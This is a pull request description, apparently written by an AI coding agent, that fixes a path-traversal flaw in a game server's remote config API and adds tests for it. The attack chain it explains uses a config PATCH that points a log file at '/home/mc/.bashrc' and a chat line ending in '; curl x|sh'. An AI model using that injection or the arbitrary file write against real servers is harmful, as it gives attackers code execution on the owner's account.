Server: keep chat-filter and anticheat files in the server folder
---
> 🤖 Opened by yahya-nusseibeh's AI agent (Claude Code, Claude Opus 5.5), not by yahya-nusseibeh personally.

## What and why

`changeable_remotely` keeps the control API away from `[engine]`, `[panel]`, `[api]` and `[discord]` so that it can't turn into code execution. But `[chat_filter]` and `[anticheat]` stay changeable, and nothing checked their four file paths: `chat_filter.log`, `chat_filter.words_file`, `anticheat.log` and `anticheat.strikes`. The game opens them as given. It appends each refused chat line, which contains the player's text, to the chat log, and rewrites the strikes file as JSON.

So a `PATCH /api/v1/config` (the token, a panel session, or the MCP `set_config` tool) with `chat_filter.log = "/home/mc/.bashrc"` made every filtered chat line land in a shell start-up file. A player who chats a filtered word followed by `; curl x|sh` then has a command waiting for the owner's next login. `anticheat.strikes` could overwrite any file the server account can write.

## The fix

1. `settings::changeable_remotely` also refuses `chat_filter.log`, `chat_filter.words_file`, `anticheat.log` and `anticheat.strikes`, so those four can only be set in `server.toml`. The other keys of both sections (`enabled`, `alerts`…) stay changeable.
2. `Config::check` refuses those four when absolute, rooted, up a level (`..`), or with a drive (`C:x`). This is the rule `prune_chunks.keep_files` already has. Their docs already say "relative to the server's folder", and the defaults are relative.

An owner who set an absolute path by hand in `server.toml` gets a clear error at start naming the key.

## Tests

- `written_files_stay_in_the_server_folder`: for each of the four keys, an absolute path, `../`, a `..` deeper in, Windows backslashes, `C:x` and `C:\…` are refused, while `logs/chat-filter.log` and an empty strikes path pass.
- `the_remote_api_keeps_away_from_what_runs`: the four keys are refused over the API, while `chat_filter.enabled` and `anticheat.alerts` are still allowed.

`cargo test -p horizon-server` passes (196).

## Kind
- [x] Fix
- [ ] Feature
- [ ] Skip release

## Other projects' code

None.

## Self-check

`cargo test -p horizon-server`, `cargo fmt --check`. (Local clippy stops on an unknown lint in horizon-core on main, from an older toolchain here; CI runs it.)

🤖 Generated with [Claude Code](https://claude.com/claude-code)
